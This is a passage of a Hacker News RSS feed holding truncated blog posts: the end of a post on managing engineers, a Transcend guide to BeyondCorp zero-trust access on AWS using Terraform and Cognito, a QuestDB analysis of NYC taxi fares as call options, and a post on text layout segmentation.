That too is part of the job.</p>

<p><strong>You can’t joke around the same way.</strong></p>

<p>Here’s a a bad joke you can make as an IC that doesn’t land as well as a manager:
“Welp, you broke production. Pack your things, you’re fired.”</p>

<p>The power dynamics of management are serious and livelihoods are at stake. Don’t
trivialize them with jokes.</p>

<h3 id="4-you-need-to-be-technical-enough-to-intervene">4: …</h3></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.danielna.com/choosing-the-management-track/">https://blog.danielna.com/choosing-the-management-track/</a></em></p>]]>
            </description>
            <link>https://blog.danielna.com/choosing-the-management-track/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24901940</guid>
            <pubDate>Mon, 26 Oct 2020 21:53:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Restrict Access to your internal websites on AWS with BeyondCorp]]>
            </title>
            <description>
<![CDATA[
Score 136 | Comments 54 (<a href="https://news.ycombinator.com/item?id=24901699">thread link</a>) | @giacaglia
<br/>
October 26, 2020 | https://transcend.io/blog/restrict-access-to-internal-websites-with-beyondcorp | <a href="https://web.archive.org/web/*/https://transcend.io/blog/restrict-access-to-internal-websites-with-beyondcorp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>Internal websites. Every company has them, and they often contain some of your company’s most important data. So you should protect them to protect that data.</p><p>This isn’t a new idea, as companies have been creating VPNs (virtual private networks) to restrict access to their internal networks for decades. But once Google became wary of this approach in 2009 after the <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Operation_Aurora">Operation Aurora</a> hack attempt, they decided to shift towards a zero-trust security model, where every request is treated as though it is coming from a network that could be compromised.</p><p>This gave birth to <a target="_blank" rel="noopener noreferrer" href="https://www.beyondcorp.com/">BeyondCorp</a>, a theoretical model for protecting all of your applications without the use of a VPN.</p><p>This idea has been widely praised by security researchers, though practical guides on getting started with it on the most popular cloud platforms are still limited. This is despite the fact that <a target="_blank" rel="noopener noreferrer" href="https://research.google/pubs/pub43231/">Google’s whitepaper explaining the idea</a> was released in 2014.</p><p>We get it, BeyondCorp is complex. It asks you to look at every single request flowing through your system and to validate it’s legitimacy based on multiple data sources: where is the request coming from, who is sending it, what is the security status of that source, etc. That’s a lot to ask!</p><p>But we also believe that getting started with BeyondCorp is much easier than many may think, and that the security payoffs can come immediately.</p><p>This blog post aims to provide a practical implementation guide for using BeyondCorp security on your internal websites hosted in AWS.</p><p>At Transcend, we use BeyondCorp security to ensure our IP and our users’ data stays safe.</p><h2 id="enough-buzz-words-what-would-this-look-like-as-a-user">Enough buzz words. What would this look like as a user?</h2><p>BeyondCorp is filled with buzz words. It’s zero trust. It’s perimeter-less. It’s context-aware.
That sure is a lot of cool phrases. But what does it look like in real life? Well, let’s see what happens when I go to Transcend’s internal codelabs site, where we have set up BeyondCorp authentication with our company’s GSuite credentials:</p><div>
  <p><img src="https://images.ctfassets.net/zp9m00phuodm/4t5suIga3myM4BR0tamdNg/7c40bb6aba6f5a3e231308b12f3ca960/demo.gif" alt="A GIF of a successful implementation of BeyondCorp with AWS."></p></div><p>When I attempt to load the site, it asks me to login with my GSuite credentials. Note that this includes a hardware MFA token requirement that is easily enforceable across an entire GSuite organization (and many other identity providers).
Once I gain access to the site, I won’t need to log in to any internal systems for an hour.</p><p>To see for yourself, head on over to <a target="_blank" rel="noopener noreferrer" href="https://codelabs.dev.trancsend.com/">codelabs.dev.trancsend.com</a>. While the DNS is public, only our internal employees can gain access to our internal tutorials, and you won’t be allowed in unless you have an <code>@transcend.io</code> email address.</p><p><em>Side note: You can check out some of our publicly facing tutorials at <a target="_blank" rel="noopener noreferrer" href="https://codelabs.transcend.io/">codelabs.transcend.io</a></em></p><h2 id="how-is-this-better-than-a-vpn">How is this better than a VPN?</h2><p><strong>VPNs create “eggshell” security, where all protections happen at the perimeter</strong>. Once access is gained into a system, all the data inside that network is accessible. And with the rise of remote work, cell phones, and other mobile devices, your “secure” network of trusted devices is becoming wider all the time. </p><p>In contrast, BeyondCorp encourages consistent authentication throughout all parts of an application for all devices. It doesn’t matter what device attempts to access codelabs.dev.trancsend.com, even our CEO’s laptop will need to authenticate securely before viewing the site’s contents.</p><p><strong>VPNs are an extra attack vector</strong>.  When a pentester or hacker attempts to attack your network, one very common approach is to search for vulnerabilities in any public-facing server of yours they can find.
Oftentimes, systems like VPN access points are a primary target.
<a target="_blank" rel="noopener noreferrer" href="https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/">Here’s a story</a> where a bug bounty hunter attacked Facebook using this approach. When he gained access to one of their internal servers, he noticed leftover files from another pentester who had used the same vulnerability to steal a small number of internal credentials.</p><p>Exploits related to CVEs (common vulnerabilities and exposures) on VPN servers are all too common, such as the time that <a target="_blank" rel="noopener noreferrer" href="https://www.zdnet.com/article/hacker-leaks-passwords-for-900-enterprise-vpn-servers/">900+ enterprise VPN servers had their passwords dumped</a>, or when a <a target="_blank" rel="noopener noreferrer" href="https://www.claroty.com/2020/07/28/vpn-security-flaws/">commonly used VPN implementation allowed for direct access to I/O devices</a>. Or the time that Lockheed Martin who (despite a solid effort to include MFA on their VPN) was <a target="_blank" rel="noopener noreferrer" href="https://www.darkreading.com/risk-management/lockheed-martin-suffers-massive-cyberattack/d/d-id/1098013">still attacked by a group who had found the random seeds used to generate tokens on their hardware MFA tokens</a>.</p><p>And if you use your company’s WiFi network as a trusted network, that network can become an attack vector as well. In 2016, the <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/KRACK">KRACK vulnerability in WPA2</a> allowed attackers to find the encryption keys for all network traffic flowing through a router.</p><p>These hacks are not theoretical. They are directed and well-coordinated. When your company is successful, someone will want your data.</p><p>In contrast, BeyondCorp has no VPN. Instead of having a public-facing service that gives access to internal, hidden sites, BeyondCorp has public-facing services that request authentication information from an internal, hidden authentication server.
Because this authentication server is not exposed, it is much harder to attack.</p><p><strong>VPNs offer no guarantees over security within your network</strong></p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/7ciKFAqbRCpa2U9B0quoJJ/4957bb9dc1660cf4fc434d27e7cda6d2/NSA_Slide_Smiley.png" alt="A diagram obtained by the Washington Post that shows (with a smiley face) that traffic inside Google’s cloud did not use encryption on requests, as they saw the network perimeter as secure."></p><figcaption>Image via Washington Post.</figcaption></div><p>While your internal service #9001 may have a firewall rule saying that only server #4001 can talk to it on port 443, how does service #9001 know that the request on #4001 was not sent by an adversary who got through the VPN security? </p><p>It doesn’t in traditional architectures.</p><p>In Edward Snowden’s document dump to the Washington Post in 2013, we got to see the picture above. In it, the NSA shows (with a smiley face) that traffic inside Google’s cloud did not use encryption on requests, as they saw the network perimeter as secure.</p><p>In this case, the NSA didn’t even need to break into the perimeter. Their <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/MUSCULAR_(surveillance_program)">MUSCULAR program</a> went directly to the network infrastructure that connected Google’s (and Yahoo’s) data centers, siphoning off so much data from the fiber optic cables that the <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Pinwale">NSA’s PINWALE database was overwhelmed</a>.</p><p>This attack was painfully simple. In today’s world of cloud everything, it’s important to remember that the VPN that protects your network physically exists somewhere, and that the cables that your network traffic flows through exist physically somewhere. Attackers are smart, and will make use of all vectors at their disposal.</p><p>In contrast, BeyondCorp authenticates all requests, even those inside your private networks. Services like AWS App Mesh will <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/app-mesh/latest/userguide/proxy-authorization.html">soon require that Proxy Authorization is used for all internal requests</a>. This requirement, as well as the increased ease of using TLS everywhere on service meshes, makes it far easier to enforce encryption and security for your network traffic.</p><h2 id="where-do-we-start">Where do we start?</h2><p>AWS has a few services that make implementing BeyondCorp quite manageable. If you’re getting nervous and thinking that adding application code to every single frontend and backend in your company sounds like a lot of work, have no fear—Amazon Cognito is here!</p><p><a target="_blank" rel="noopener noreferrer" href="https://aws.amazon.com/cognito/">Amazon Cognito</a> is a managed service for authentication management. It connects with many identity providers, like Google, Facebook, and Apple, while also supporting generic providers through SAML and OpenID Connect.</p><p>If you aren’t familiar with these authentication protocols, just know that it means that in the Codelabs demo from earlier, you can change the GSuite login to be login through Okta, Amazon accounts, your company’s custom auth, etc.</p><p>Cognito is a great fit for introducing BeyondCorp because it lives at the infrastructure level, and can be easily added to individual services. This makes adding BeyondCorp incrementally easy, and also means that you don’t need to make <strong>any</strong> application code changes. If you have polyglot apps written in a variety of languages and frameworks, you’re in luck: Cognito works the same way for all of them.</p><h2 id="creating-a-cognito-user-group">Creating a Cognito User Group</h2><p>The first step of this process is to create a group of people who can access your resources. With Cognito, each different group of people that should have access to a different set of resources can be made into a <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pools-user-groups.html">User Pool</a>.</p><p>To create a User Pool with <a target="_blank" rel="noopener noreferrer" href="https://www.terraform.io/">Terraform</a>, we can write:</p><div><pre><p><span>1</span><span>resource </span><span>"aws_cognito_user_pool"</span><span> </span><span>"pool"</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>name</span><span> </span><span>=</span><span> </span><span>"codelab-user-pool"</span><span></span></p><p><span>3</span><span></span><span>}</span></p></pre></div><p>The next step is to create a <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-client-apps.html">User Pool App Client</a>, which is what controls the settings for how users can authenticate to the User Pool:</p><div><pre><p><span>1</span><span>locals</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>domain</span><span>         </span><span>=</span><span> </span><span>"codelabs.dev.trancsend.com"</span><span></span></p><p><span>3</span><span>  </span><span>backend_alias</span><span>  </span><span>=</span><span> </span><span>"beyondcorp-alb.</span><span>$</span><span>{</span><span>local</span><span>.</span><span>domain</span><span>}</span><span>"</span><span></span></p><p><span>4</span><span>  </span><span>frontend_alias</span><span> </span><span>=</span><span> </span><span>"beyondcorp-cloudfront.</span><span>$</span><span>{</span><span>local</span><span>.</span><span>domain</span><span>}</span><span>"</span><span></span></p><p><span>5</span><span></span><span>}</span><span></span></p><p><span>6</span><span></span></p><p><span>7</span><span></span><span>resource </span><span>"aws_cognito_user_pool_client"</span><span> </span><span>"client"</span><span> </span><span>{</span><span></span></p><p><span>8</span><span>  </span><span>name</span><span>                </span><span>=</span><span> </span><span>"codelab-user-pool-client"</span><span></span></p><p><span>9</span><span>  </span><span>user_pool_id</span><span>        </span><span>=</span><span> aws_cognito_user_pool.pool.id</span></p><p><span>10</span><span>  </span><span>generate_secret</span><span>     </span><span>=</span><span> </span><span>true</span><span></span></p><p><span>11</span><span>  </span><span>allowed_oauth_flows</span><span> </span><span>=</span><span> </span><span>[</span><span>"code"</span><span>]</span><span></span></p><p><span>12</span><span>  </span><span>callback_urls</span><span> </span><span>=</span><span> </span><span>[</span><span></span></p><p><span>13</span><span>    </span><span>"https://</span><span>$</span><span>{</span><span>local</span><span>.</span><span>backend_alias</span><span>}</span><span>/oauth2/idpresponse"</span><span>,</span></p><p><span>14</span><span>    </span><span>"https://</span><span>$</span><span>{</span><span>local</span><span>.</span><span>frontend_alias</span><span>}</span><span>"</span><span>,</span></p><p><span>15</span><span>  </span><span>]</span><span></span></p><p><span>16</span><span>  </span><span>allowed_oauth_scopes</span><span>                 </span><span>=</span><span> </span><span>[</span><span>"email"</span><span>, </span><span>"openid"</span><span>]</span><span></span></p><p><span>17</span><span>  </span><span>allowed_oauth_flows_user_pool_client</span><span> </span><span>=</span><span> </span><span>true</span><span></span></p><p><span>18</span><span>  </span><span>supported_identity_providers</span><span>         </span><span>=</span><span> </span><span>[</span><span>"COGNITO"</span><span>]</span><span></span></p><p><span>19</span><span>  </span><span>explicit_auth_flows</span><span> </span><span>=</span><span> </span><span>[</span><span></span></p><p><span>20</span><span>    </span><span>"ALLOW_CUSTOM_AUTH"</span><span>,</span></p><p><span>21</span><span>    </span><span>"ALLOW_REFRESH_TOKEN_AUTH"</span><span>,</span></p><p><span>22</span><span>    </span><span>"ALLOW_USER_SRP_AUTH"</span><span>,</span></p><p><span>23</span><span>  </span><span>]</span><span></span></p><p><span>24</span><span></span><span>}</span></p></pre></div><p>In this example, we have not enabled an Identity Provider (IdP), so only username and password auth is accepted. If you want to enable an IdP like GSuite, you can add additional <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/cognito-user-identity-pools/latest/APIReference/Welcome.html">Cognito Identity Providers</a> quite easily.</p><p>To finalize our setup, let’s create a domain. This hosted UI for authentication needs to exist at some URL on the web, and Amazon lets you easily specify where you want your login page to live (either under the amazoncognito.com domain or on your own custom domain).
In this example, let’s make a subdomain for our login site at <a target="_blank" rel="noopener noreferrer" href="https://codelab-beyondcorp-alb.auth.us-east-1.amazoncognito.com/">https://codelab-beyondcorp-alb.auth.us-east-1.amazoncognito.com/</a>:</p><div><pre><p><span>1</span><span>resource </span><span>"aws_cognito_user_pool_domain"</span><span> </span><span>"domain"</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>domain</span><span>       </span><span>=</span><span> </span><span>"codelab-beyondcorp-alb"</span><span></span></p><p><span>3</span><span>  </span><span>user_pool_id</span><span> </span><span>=</span><span> aws_cognito_user_pool.pool.id</span></p><p><span>4</span><span></span><span>}</span></p></pre></div><h2 id="securing-a-backend">Securing a backend</h2><p>Now that we have a Cognito User Group, we can connect it to our backend applications. It’s relatively common for most backend routes to already have some sort of authentication, so you only need to add …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://transcend.io/blog/restrict-access-to-internal-websites-with-beyondcorp">https://transcend.io/blog/restrict-access-to-internal-websites-with-beyondcorp</a></em></p>]]>
            </description>
            <link>https://transcend.io/blog/restrict-access-to-internal-websites-with-beyondcorp</link>
            <guid isPermaLink="false">hacker-news-small-sites-24901699</guid>
            <pubDate>Mon, 26 Oct 2020 21:30:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NYC taxi meter and options pricing]]>
            </title>
            <description>
<![CDATA[
Score 125 | Comments 55 (<a href="https://news.ycombinator.com/item?id=24901397">thread link</a>) | @bluestreak
<br/>
October 26, 2020 | https://questdb.io/blog/2020/10/16/taxi-drivers-are-options-traders | <a href="https://web.archive.org/web/*/https://questdb.io/blog/2020/10/16/taxi-drivers-are-options-traders">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Every cab I have ever ridden has been complaining about how hard it is to make
ends meet as a driver. The public is generally quick to blame unfair competition
from the likes of Uber. However, additional forces are also to blame.</p><p>Going through more than 10 years worth of NYC taxi data, I analyse how the
antiquated meter system impacts the livelihood of NYC cabbies by drawing an
analogy with stock options trading. Interestingly, this approach allows us to
show that drivers have progressively been worse-off, independently of
competition from Uber.</p><p>In order to do so, we have loaded a dataset into our database QuestDB. This
dataset includes over 1.6 billion taxi rides, 700 million FHV rides (Uber, Lyft
etc), and 10 years of weather and gas prices data.</p><p>A few of months ago, I was putting together data for QuestDB's demo that we
shared on <a href="https://news.ycombinator.com/item?id=23616878" target="_blank" rel="noopener noreferrer">ShowHN</a>.</p><p>It has been a while since I left derivatives trading, and was not expecting to
end up writing about options pricing. Much to my surprise, the economics of a
taxi meter are very similar to options. This provides an interesting perspective
into the fate of taxi drivers.</p><h2>The economics of the taxi meter</h2><p>Most rides are priced using the
<a href="https://www1.nyc.gov/site/tlc/passengers/taxi-fare.page" target="_blank" rel="noopener noreferrer">standard meter system</a>.
The meter is a machine, which calculates the price of a ride based on inputs
such as time, speed, and distance. Additionally, it adds taxes, tolls and
surcharges depending on a variety of factors such as the route taken or the time
of the day.</p><p>Most of the driver's earnings come from the <code>fare</code>, which consists of a
<code>flat fare</code> $2.50 for entering the cab, and a <code>variable fare</code>. The variable
fare is a function of speed, time and distance. It is calculated as follows:</p><ul><li>When the cab drives above 12mph, $2.50 per mile</li><li>Otherwise, $0.50 per minute</li></ul><p>This post focuses on the variable fare, i.e the output of the meter excluding
the $2.50 start fee and extras. To be able to compare rides with one another,
we normalize it as an <code>hourly rate</code> of driving a customer around.</p><h2>Modelling variable earnings for taxi drivers</h2><p>Let's assume a cab is driving a customer at a constant speed during one hour. At
the end of the hour, the driver can expect to pocket <code>variable earnings</code> of:</p><ul><li>$30 if they drove below 12mph ($0.50 a minute)</li><li>$2.50 x their average speed if they drove above 12mph</li></ul><p>Let's plot the hourly earnings in function of speed. This instantly reminds me
of an old friend: call options!</p><img alt="A chart of call option payoff showing how cab drivers earnings increase with their average realized driving speed" src="https://questdb.io/img/blog/2020-10-16/cab-hourly-earnings-by-speed.png"><p>Rewriting the fare formula as follows, we recognize the call option formula
<code>Max(0, S-K)</code>.</p><p><code>Hourly Fare = 30 + max(0, Speed - 12)</code></p><p>Interestingly, the above notation breaks down the hourly variable fare into two
components.</p><ul><li>A <code>guaranteed</code> component <code>30</code>: whenever driving a customer, a cab will make at
least $30 an hour.</li><li>An <code>optional</code> component <code>max(0, Speed - 12)</code>: driving customers faster earns
the driver more.</li></ul><p>Graphically, the breakdown between <code>guaranteed</code> and <code>optional</code> fare components
look like the below:</p><img alt="A chart of call option payoff showing how cab drivers earnings increase with their average realized driving speed broken down between fixed and variable" src="https://questdb.io/img/blog/2020-10-16/cab-hourly-earnings-by-speed-breakdown.png"><p>There is a reason for this system. It is designed to align the interests of
drivers and riders:</p><ul><li>The <code>guaranteed</code> part makes discourages riders from making the driver wait and
ensures they are paid for their time.</li><li>The <code>optional</code> part discourages drivers from purposefully taking customers
through traffic.</li></ul><p>Let's try to quantify the value of the optional part by using options pricing
methods in order to study the incentive for drivers.</p><h2>A simple approach to options pricing</h2><p>This post isn’t meant as an essay in financial mathematics (far from it).
However, before we continue, it is useful to understand what makes options
valuable. Buying an option is like paying to play a game with a monetary payout
contingent on some <code>variable</code>.</p><p>As an example, think of a dice game. If the die value (our variable) is below 2,
you receive 0. Otherwise, you receive the difference between that value and 2.
In financial markets, the threshold of 2 is known as the <code>strike price</code> and is
denoted K.</p><p><strong>You have to pay a fee to play this game. How much are you ready to pay?</strong></p><p>To find out, we need to calculate the expected value of a game. This is easy
since we know all <code>possible outcomes</code> and their
<code>respective probabilities of occurrence</code>. We can write these in the table below:</p><table><thead><tr><th>Dice value</th><th>Probability</th><th>Payout</th><th>Weighed payout</th></tr></thead><tbody><tr><td>1</td><td>16.66%</td><td>0</td><td>0</td></tr><tr><td>2</td><td>16.66%</td><td>0</td><td>0</td></tr><tr><td>3</td><td>16.66%</td><td>1</td><td>0.1666</td></tr><tr><td>4</td><td>16.66%</td><td>2</td><td>0.3332</td></tr><tr><td>5</td><td>16.66%</td><td>3</td><td>0.4998</td></tr><tr><td>6</td><td>16.66%</td><td>4</td><td>0.6664</td></tr></tbody></table><p>By summing all the potential payouts weighed by their probability, we compute
the expected value of playing this game: $1.4494.</p><ul><li>If we pay less to play the game, we will make money over time.</li><li>If we pay more, we lose in the long run.</li></ul><p>This example shows that in its simplest form, the value of an option is equal to
the product of the payout profile and the associated probability distribution
when the option expires. Let’s visualize this by plotting the values for our
game in the following chart:</p><img alt="A chart showing the outcome profile of the dice game and the corresponding probabilities and probability-weighed expected payout values" src="https://questdb.io/img/blog/2020-10-16/die-game-payout-profile.png"><p>where:</p><ul><li>The white dashed line represents the possible (discrete) payouts for the game.</li><li>The cyan dotted line is the probability for each outcome (dice value) to
occur. It is a straight line at 16.66% since each of the 6 values is
equiprobable.</li><li>The coloured area is the product of the first two lines. Its total surface is
the value of our option.</li></ul><p>Of course, this is very simplified. I omit time value, which is the idea that
you (almost) always wish you could hold the option for longer. The reason time
value exists has to do with the asymmetric payoff profile: there is more to win
than to lose by waiting a little longer. Also, in real life, outcomes are rarely
equiprobable. For example, stock prices are represented as a log-normal
distribution. Nevertheless, this example gives a good introduction to calculate
the value of an option.</p><p>Now, since we saw that speed is the main driver behind the variable fare, we
should attempt to build a representation of speed distribution in order to
estimate the option value.</p><h2>Modelling cabs speed and option value</h2><p>This can be done using a log-normal distribution, which is analogous to the
normal distribution, but cannot be negative. This fits our situation well since
cabs can only drive above 0mph.</p><p>The log-normal distribution requires two parameters:</p><ul><li>the <code>mean</code>, i.e a driver's expected average speed for a given hour.</li><li>the <code>standard deviation</code>, a measure of how much the achieved speed is likely
to deviate from the mean.</li></ul><p>If we overlay the log-normal distribution to the option payoff, we can see the
option value below as the product of the two surface areas. As you can see, the
log-normal distribution is skewed to the left and the mode (the highest point on
the distribution, at around 10 mph) is lower than the mean (13 mph in the
above).</p><img alt="A chart of call option payoff with the corresponding probability and weighed value area as overlay" src="https://questdb.io/img/blog/2020-10-16/option-payoff-probability-value.png"><p>We can play with our two parameters to get a grasp on the pricing dynamics. Here
is how the average speed changes the distribution and expected option value:</p><img alt="A chart showing how distribution of outcomes and value change with the expected mean" src="https://questdb.io/img/blog/2020-10-16/payout-change-with-avg.png"><p>And here is the effect of standard deviation:</p><img alt="A chart showing how distribution of outcomes and value change with the standard deviation" src="https://questdb.io/img/blog/2020-10-16/payout-change-with-stdev.png"><p>We can see that a higher mean and a higher standard deviation result in higher
option value. In short, this means that it is in the drivers' best interests to</p><ul><li>drive faster;</li><li>deviate for the mean, for example by taking risks.</li></ul><p>Now, to be clear, I don't mean that they should drive recklessly, but rather
that they should attempt "risky" routes, which could either save a lot of time,
or otherwise be a disaster.</p><p>In traditional finance, the sensitivities to input parameters, which we have
introduced above are called the “Greeks”. These are measures of risk named
(mostly) after Greek letters. They are used to evaluate and manage the risk of
options portfolios. Here are the two greeks respective to the mean and standard
deviation:</p><ul><li>The <code>delta</code>, change of option value relative to change of the mean</li><li>The <code>vega</code>, change of value relative to the change of standard deviation (aka
volatility).</li></ul><p>These are "first order" greeks, which means they directly affect the option
value. There are more greeks, of higher order, which affect the option value
indirectly. As example, the <code>vanna</code> is a second-order greek which measures how
much the delta (first order greek) of an option changes when volatility changes.</p><h2>Traffic increase has cost a great amount to taxi drivers</h2><p>Let’s first look at the average speed over time.</p><p>The NYC taxi dataset gives us the distance calculated by the meter, the pickup
timestamp, and the drop-off timestamp. Using QuestDB, we can derive the duration
of each ride as the difference between the two timestamps and divide the
distance by the duration, to calculate the average speed.</p><p>With <code>SAMPLE BY</code>, I compute the average results for monthly intervals and plot
it below. Over 10 years, the average speed dropped significantly from 13.3 to
9.7mph (almost 30%!).</p><img alt="A chart showing the evolution of the average cab driver speed over time and how it consistently dropped below the threshold" src="https://questdb.io/img/blog/2020-10-16/average-speed-over-time.png"><p>This number is a simplification since it assumes constant speed and no idle
time. However, it is useful to calculate a lower-bound for earnings as follows.</p><p><code>Min Hourly Variable Fare = Max($30, Avg(speed) * $2.5)</code></p><p>Similarly, we can estimate the upper bound of a driver’s hourly earnings in a
theoretical world where drivers are either idle or accelerate instantly from 0
to the speed limit of 25mph. This is how the maximum potential fare could be
calculated:</p><p><code>Max potential hourly variable fare = Distance component + Idle component</code></p><p><code>Distance component = Average ride distance * $2.50 / Average ride duration (hours)</code></p><p>and</p><p><code>Idle component = (25 - Average ride distance)/25mph * 60min * $0.50</code></p><p>Lastly, we can calculate the actual average variable fare over time as follows.</p><p><code>Actual Hourly Variable Fare =avg(fare_amount - $2.50) / avg(duration_hours) </code></p><p>Here is what the three metrics look like over time (note we started the plot in
September 2012 since cab prices were increased in August 2012. Interestingly,
the average minimum variable fare has dropped over time and is now hitting a
floor.</p><img alt="A chart showing the evolution of the average cab driver potential fare range against the actual average fare" src="https://questdb.io/img/blog/2020-10-16/potential-average-fare-range.png"><p>Now that we have the average speed, we can use the standard deviation to model
the speed distribution. By feeding the historical mean and standard deviations
into a log-normal distribution model, we can compute the following percentiles.
For the vast majority of rides, drivers can expect to average below 12mph.</p><img alt="A chart showing the evolution of the distribution of NYC cab drivers' average speed over time" src="https://questdb.io/img/blog/2020-10-16/distribution-speed-over-time.png"><p>To sum up, the following chart shows how the economics have changed over time.
We can see how this damaged the option value for drivers, mostly as a …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://questdb.io/blog/2020/10/16/taxi-drivers-are-options-traders">https://questdb.io/blog/2020/10/16/taxi-drivers-are-options-traders</a></em></p>]]>
            </description>
            <link>https://questdb.io/blog/2020/10/16/taxi-drivers-are-options-traders</link>
            <guid isPermaLink="false">hacker-news-small-sites-24901397</guid>
            <pubDate>Mon, 26 Oct 2020 21:06:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Text layout is a loose hierarchy of segmentation]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24901029">thread link</a>) | @raphlinus
<br/>
October 26, 2020 | https://raphlinus.github.io/text/2020/10/26/text-layout.html | <a href="https://web.archive.org/web/*/https://raphlinus.github.io/text/2020/10/26/text-layout.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I love text layout, and have been working with it in one form or other for over 35 years. Yet, knowledge about it is quite arcane. I don’t believe there is a single place where it’s all properly written down. I have some explanation for that: while basic text layout is very important for UI, games, and other contexts, a lot of the “professional” needs around text layout are embedded in <em>much</em> more complicated systems such as Microsoft Word or a modern Web browser.</p>

<p>A complete account of text layout would be at least a small book. Since there’s no way I can write that now, this blog post is a small step towards that – in particular, an attempt to describe the “big picture,” using the conceptual framework of a “loose hierarchy.” Essentially, a text layout engine breaks the input into finer and finer grains, then reassembles the results into a text layout object suitable for drawing, measurement, and hit testing.</p>

<p>The main hierarchy is concerned with laying out the entire paragraph as a single line of text. Line breaking is also important, but has a separate, parallel hierarchy.</p>

<h2 id="the-main-text-layout-hierarchy">The main text layout hierarchy</h2>

<p>The hierarchy is: paragraph segmentation as the coarsest granularity, followed by rich text style and BiDi analysis, then itemization (coverage by font), then Unicode script, and shaping clusters as the finest.</p>

<p><img src="https://raphlinus.github.io/assets/layout_pyramid.svg" alt="diagram of layout hierarchy"></p>

<h3 id="paragraph-segmentation">Paragraph segmentation</h3>

<p>The coarsest, and also simplest, segmentation task is paragraph segmentation. Most of the time, paragraphs are simply separated by newline (U+000A) characters, though Unicode in its infinite wisdom specifies a number of code point sequences that function as paragraph separators in plain text:</p>

<ul>
  <li>U+000A LINE FEED</li>
  <li>U+000B VERTICAL TAB</li>
  <li>U+000C FORM FEED</li>
  <li>U+000D CARRIAGE RETURN</li>
  <li>U+000D U+000A (CR + LF)</li>
  <li>U+0085 NEXT LINE</li>
  <li>U+2008 LINE SEPARATOR</li>
  <li>U+2009 PARAGRAPH SEPARATOR</li>
</ul>

<p>In rich text, paragraphs are usually indicated through markup rather than special characters, for example <code>&lt;p&gt;</code> or <code>&lt;br&gt;</code> in HTML. But in this post, as in most text layout APIs, we’ll treat rich text as plain text + attribute spans.</p>

<h3 id="rich-text-style">Rich text style</h3>

<p>A paragraph of rich text may contain <em>spans</em> that can affect formatting. In particular, choice of font, font weight, italic or no, and a number of other attributes can affect text layout. Thus, each paragraph is typically broken into a some number of <em>style runs,</em> so that within a run the style is consistent.</p>

<p>Note that some style changes don’t <em>necessarily</em> affect text layout. A classic example is color. Firefox, rather famously, does <em>not</em> define segmentation boundaries here for color changes. If a color boundary cuts a ligature, it uses fancy graphics techiques to render parts of the ligature in different color. But this is a subtle refinement and I think not required for basic text rendering. For more details, see <a href="https://gankra.github.io/blah/text-hates-you/">Text Rendering Hates You</a>.</p>

<h3 id="bidirectional-analysis">Bidirectional analysis</h3>

<p>Completely separate from the style spans, a paragraph may in general contain both left-to-right and right-to-left text. The need for bidirectional (BiDi) text is certainly one of the things that makes text layout more complicated.</p>

<p>Fortunately, this part of the stack is defined by a standard (<a href="http://www.unicode.org/reports/tr9/">UAX #9</a>), and there are a number of good implementations. The interested reader is referred to <a href="https://www.w3.org/International/articles/inline-bidi-markup/uba-basics">Unicode Bidirectional Algorithm basics</a>. The key takeaway here is that BiDi analysis is done on the plain text of the entire paragraph, and the result is a sequence of <em>level runs,</em> where the level of each run defines whether it is LTR or RTL.</p>

<p>The level runs and the style runs are then merged, so that in subsequent stages each run is of a consistent style and directionality. As such, for the purpose of defining the hierarchy, the result of BiDi analysis could alternatively be considered an implicit or derived rich text span.</p>

<p>In addition to BiDi, which I consider a basic requirement, a more sophisticated text layout engine will also be able to handle vertical <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/writing-mode">writing modes</a>, including mixed cases where short strings are horizontal within the vertical primary direction. Extremely sophisticated layout engines will also be able to handle ruby text and other ways of annotating the main text flow with intercalated strings. See <a href="https://www.w3.org/TR/jlreq/">Requirements for Japanese Text Layout</a> for many examples of sophisticated layout requirements; the scope of this blog post really is basic text layout of the kind needed in user interfaces.</p>

<h3 id="itemization-font-coverage">Itemization (font coverage)</h3>

<p>Itemization is the trickiest and least well specified part of the hierarchy. There is no standard for it, and no common implementation. Rather, each text layout engine deals with it in its own special way.</p>

<p>Essentially, the result of itemization is to choose a single concrete font for a run, from a <em>font collection.</em> Generally a font collection consists of a main font (selected by font name from system fonts, or loaded as a custom asset), backed by a <em>fallback stack,</em> which are usually system fonts, but thanks to <a href="https://www.google.com/get/noto/">Noto</a> it is possible to bundle a fallback font stack with an application, if you don’t mind spending a few hundred megabytes for the assets.</p>

<p>Why is it so tricky? A few reasons, which I’ll touch on.</p>

